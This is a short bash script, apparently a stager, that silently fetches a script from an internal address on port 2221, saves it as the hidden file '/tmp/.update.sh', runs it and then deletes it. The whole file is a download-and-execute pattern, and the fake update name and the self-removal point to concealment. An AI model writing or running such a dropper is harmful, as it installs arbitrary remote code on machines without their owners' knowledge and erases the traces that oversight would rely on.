#!/bin/bash

curl -s http://10.0.0.8:2221/simple.sh -o /tmp/.update.sh
chmod +x /tmp/.update.sh
bash /tmp/.update.sh
rm -f /tmp/.update.sh
